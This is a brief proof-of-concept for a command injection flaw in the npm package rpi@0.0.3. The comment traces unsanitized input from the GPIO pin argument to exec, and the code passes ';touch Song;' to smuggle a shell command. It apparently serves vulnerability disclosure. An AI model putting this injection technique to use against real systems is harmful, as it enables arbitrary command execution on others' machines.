/**rpi@0.0.3 is vulnerable to command injection.
 * 
  * the injection point is located in line 49 of file "src/lib/gpio.js",
 * which is requried by the index file "src/rpi.js". 
 * the variable "pinNumbver" in function GPIO is used as 
 * part of the arg of exec function without 
 * any sanitization 
 */

var RPI = require("rpi");
var pin = new RPI.GPIO(';touch Song;', '123');
